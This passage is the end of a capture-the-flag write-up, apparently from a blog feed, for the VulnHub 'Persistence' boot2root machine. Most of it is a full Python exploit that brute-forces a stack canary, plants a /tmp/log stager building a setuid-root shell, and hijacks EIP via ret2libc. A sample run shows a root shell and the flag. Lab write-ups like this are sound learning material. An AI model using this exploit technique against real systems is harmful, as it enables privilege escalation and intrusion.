-     / ___/|    \| |     /   \|    ||      |
-    (   \_ |  o  ) |    |     ||  | |      |
-     \__  ||   _/| |___ |  O  ||  | |_|  |_|
-     /  \ ||  |  |     ||     ||  |   |  |
-     \    ||  |  |     ||     ||  |   |  |
-      \___||__|  |_____| \___/|____|  |__|
-
-                A: &amp;quot;AKA: FU superkojiman &amp;amp;&amp;amp; sagi- !!&amp;quot;
-                A: &amp;quot;I also have no idea what I am doing&amp;quot;
-&amp;quot;&amp;quot;&amp;quot;
-
-print &amp;quot;[+] Connecting &amp;amp; starting canary brute force...&amp;quot;
-
-# start the canary brute loop. We want to brute 4 bytes ...
-for x in xrange(1,5):
-
-    # ... and try all possibilities
-    for canary_byte in xrange(0, 256):
-
-        # prepare the byte
-        hex_byte = chr(canary_byte)
-
-        # prepare the payload
-        send = payload + canary + hex_byte
-
-        # connect and send payload
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((&#39;127.0.0.1&#39;, 3333))
-
-        # get the inital banners
-        sock.recv(35)   # [+] hello, my name is sploitable\n
-        sock.recv(40)   # [+] would you like to play a game?\n
-        sock.recv(5)    # &amp;gt;
-
-        # send the payload
-        sock.send(send)
-        sock.recv(27)   # [+] yeah, I don&#39;t think so\n
-
-        # if we have a OK response, then we will have this last part
-        # as &#39;[+] bye!\n&#39; populated, if its wrong, not
-        data =  sock.recv(64)   # [+] bye!\n
-        if &amp;quot;bye&amp;quot; in data:
-            print &amp;quot;[+] Found a possible canary value of &#39;{0}&#39;!&amp;quot;.format(hex_byte.encode(&amp;quot;hex&amp;quot;))
-            canary += hex_byte
-            sock.close()
-            break
-
-        sock.close()
-    # if we cant even find the first byte, we failed already
-    if len(canary) &amp;lt;= 0:
-        print &amp;quot;[-] Unable to even find the first bit of the canary. No luck&amp;quot;
-        sys.exit(0)
-
-# The canary is our ticket out of here!
-if len(canary) == 4:
-
-    print &amp;quot;[+] Canary known as : {0}&amp;quot;.format(canary.encode(&amp;quot;hex&amp;quot;))
-    print &amp;quot;[+] Writing /tmp/log to be called by wopr later&amp;quot;
-
-    # ./wopr has the string /tmp/log in it. We will use this as
-    # our code exec point, overwriting whatever is in it atm
-    stager = &amp;quot;&amp;quot;&amp;quot;
-        #!/bin/sh
-
-        # First, prepare a small C shell and move it to /tmp with name getroot
-        echo &amp;quot;int main(void)\n{\nsetuid(0);\nsystem(\\&amp;quot;/bin/sh\\&amp;quot;);\nreturn 0;\n}&amp;quot; &amp;gt; /tmp/getroot.c
-
-        # compile it
-        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot
-
-        # change ownership and setuid
-        /bin/chown root:root /tmp/getroot
-        /bin/chmod 4777 /tmp/getroot
-    &amp;quot;&amp;quot;&amp;quot;
-
-    # write the file
-    with open(&#39;/tmp/log&#39;,&#39;w&#39;) as stager_file:
-        stager_file.write(stager)
-
-    # make it executable
-    os.chmod(&#39;/tmp/log&#39;, 0755)
-
-    # now, with the stack canary known and the stager ready, lets corrupt
-    # EIP and sploit!
-    payload += canary               # canary we bruted
-    payload += &amp;quot;A&amp;quot; * 4              # padding to EIP wich is at byte 42
-    payload += &amp;quot;\x10\x62\xe5\xb7&amp;quot;   # system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.
-    payload += &amp;quot;JUNK&amp;quot;               # JUNK. Should probably do exit() here. Meh.
-    payload += &amp;quot;\x60\x8c\x04\x08&amp;quot;   # location if /tmp/log string in .data
-
-    # and connect &amp;amp;&amp;amp; send
-    print &amp;quot;[+] Connecting to service&amp;quot;
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((&#39;127.0.0.1&#39;, 3333))
-    sock.recv(35)
-    sock.recv(40)
-    sock.recv(5)
-    print &amp;quot;[+] Sending Payload&amp;quot;
-    sock.send(payload)
-
-    sock.recv(64)
-    sock.close()
-    print &amp;quot;[+] Done&amp;quot;
-
-    print &amp;quot;[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)&amp;quot;
-    os.system(&amp;quot;/tmp/getroot&amp;quot;)
-
-else:
-    print &amp;quot;[!] Incomplete Canary. Can&#39;t continue reliably&amp;quot;
-
-# done
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A sample run would be:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ ls -lah /tmp/sploit.py
--rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
-bash-4.1$ python /tmp/sploit.py
-
-            A: &amp;quot;So, I heard you like pain...?&amp;quot;
-            B: &amp;quot;... a bit&amp;quot;
-            C: &amp;quot;Well, here it is, the: &amp;quot;
- ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
-|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
-|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
-|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
-|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
-|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
-|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
-      _____ ____  _       ___  ____  ______
-     / ___/|    \| |     /   \|    ||      |
-    (   \_ |  o  ) |    |     ||  | |      |
-     \__  ||   _/| |___ |  O  ||  | |_|  |_|
-     /  \ ||  |  |     ||     ||  |   |  |
-     \    ||  |  |     ||     ||  |   |  |
-      \___||__|  |_____| \___/|____|  |__|
-
-                A: &amp;quot;AKA: FU superkojiman &amp;amp;&amp;amp; sagi- !!&amp;quot;
-                A: &amp;quot;I also have no idea what I am doing&amp;quot;
-
-[+] Connecting &amp;amp; starting canary bruteforce...
-[+] Found a possible canary value of &#39;64&#39;!
-[+] Found a possible canary value of &#39;d3&#39;!
-[+] Found a possible canary value of &#39;c6&#39;!
-[+] Found a possible canary value of &#39;15&#39;!
-[+] Canary known as : 64d3c615
-[+] Writing /tmp/log to be called by wopr later
-[+] Connecting to service
-[+] Sending Payload
-[+] Done
-[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)
-sh-4.1# id
-uid=0(root) gid=500(avida) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And, as proof, we cat the flag!&lt;/p&gt;
-
-&lt;p&gt;```bash Persistence w00t
-sh-4.1# cat /root/flag.txt
-              .d8888b.  .d8888b. 888
-             d88P  Y88bd88P  Y88b888
-             888    888888    888888
-888  888  888888    888888    888888888
-888  888  888888    888888    888888
-888  888  888888    888888    888888
-Y88b 888 d88PY88b  d88PY88b  d88PY88b.
- &amp;ldquo;Y8888888P&amp;rdquo;  &amp;ldquo;Y8888P&amp;rdquo;  &amp;ldquo;Y8888P&amp;rdquo;  &amp;ldquo;Y888&lt;/p&gt;
-
-&lt;p&gt;Congratulations!!! You have the flag!&lt;/p&gt;
-
-&lt;p&gt;We had a great time coming up with the
-challenges for this boot2root, and we
-hope that you enjoyed overcoming them.&lt;/p&gt;
-
-&lt;p&gt;Special thanks goes out to @VulnHub for
-hosting Persistence for us, and to
-@recrudesce for testing and providing
-valuable feedback!&lt;/p&gt;
-
-&lt;p&gt;Until next time,
-      sagi- &amp;amp; superkojiman
-```&lt;/p&gt;
-
-&lt;h2 id=&#34;conclusion:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;conclusion&lt;/h2&gt;
-
-&lt;p&gt;Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;amp;&amp;amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!&lt;/p&gt;
-
-&lt;h2 id=&#34;thats-not-all:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;thats not all&lt;/h2&gt;
-
-&lt;p&gt;There are however a few more things I&amp;rsquo;d like to try.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Find if and how we can root Persistence using &lt;code&gt;sysadmin-tool&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Modify the exploit to a working ROP payload&lt;/li&gt;
-&lt;li&gt;Explore other avenues to break out of rbash&lt;/li&gt;
-&lt;/ul&gt;
 </description>
     </item>
     
